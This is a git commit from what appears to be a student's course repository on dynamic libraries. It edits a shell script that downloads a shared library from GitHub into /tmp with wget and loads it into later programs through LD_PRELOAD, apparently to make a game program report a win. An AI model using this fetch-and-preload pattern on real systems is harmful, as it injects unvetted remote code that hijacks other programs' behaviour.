fb4a10f3e05b960d0f71ed07a189468539bbb4db
Nate Petersen <nate.petersen@me.com>
2019-05-06 23:42:11 +0000

    updated script

--- 0x17-dynamic_libraries/101-make_me_win.sh
+++ 0x17-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/winning.so https://github.com/blueExcess/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/winning.so
-export LD_PRELOAD=/tmp/winning.so
+wget -O /tmp/win.so https://github.com/blueExcess/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
+export LD_PRELOAD=/tmp/win.so
